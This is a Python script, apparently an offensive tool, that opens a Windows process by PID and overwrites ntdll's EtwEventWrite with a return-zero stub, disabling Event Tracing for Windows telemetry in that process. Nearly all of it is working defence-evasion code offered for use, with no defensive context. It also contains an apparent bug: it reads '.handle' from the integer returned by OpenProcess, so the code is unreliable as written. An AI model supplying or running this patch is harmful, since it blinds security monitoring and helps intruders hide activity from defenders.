import ctypes
import sys

from ctypes import wintypes

ntdll = ctypes.WinDLL("ntdll.dll")
ntprotect = ntdll.NtProtectVirtualMemory
ntwrite = ntdll.NtWriteVirtualMemory

PAGE_EXECUTE_READWRITE = 0x40
patch = bytes([0x48, 0x33, 0xc0, 0xc3])

def main():
    pid = int(sys.argv[1])
    hProc = ctypes.windll.kernel32.OpenProcess(
        ctypes.wintypes.DWORD(0x001F0FFF), False, ctypes.wintypes.DWORD(pid)
    )
    if not hProc:
        print(f"Failed to open process with PID {pid}")
        return

    etwaddr = ctypes.c_void_p(ctypes.cast(
        ctypes.windll.kernel32.GetProcAddress(
            ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
            b"EtwEventWrite"
        ),
        ctypes.c_void_p
    ).value)

    olprotec = wintypes.DWORD(0)

    ntprotect.argtypes = [
        wintypes.HANDLE, wintypes.PVOID, wintypes.PSIZE,
        wintypes.ULONG, wintypes.PULONG
    ]
    ntprotect.restype = wintypes.LONG

    ntwrite.argtypes = [
        wintypes.HANDLE, wintypes.PVOID, wintypes.PVOID,
        wintypes.ULONG, wintypes.PULONG
    ]
    ntwrite.restype = wintypes.LONG

    # Patching
    ntprotect(
        hProc.handle, ctypes.byref(etwaddr),
        ctypes.byref(ctypes.c_size_t(4)), PAGE_EXECUTE_READWRITE,
        ctypes.byref(olprotec)
    )

    bytes_written = wintypes.SIZE_T(0)
    ntwrite(
        hProc.handle, etwaddr, patch, len(patch),
        ctypes.byref(bytes_written)
    )

    ntprotect(
        hProc.handle, ctypes.byref(etwaddr),
        ctypes.byref(ctypes.c_size_t(4)), olprotec.value,
        ctypes.byref(olprotec)
    )

    ctypes.windll.kernel32.CloseHandle(hProc)

    print("ETW patched!")

if __name__ == "__main__":
    main()
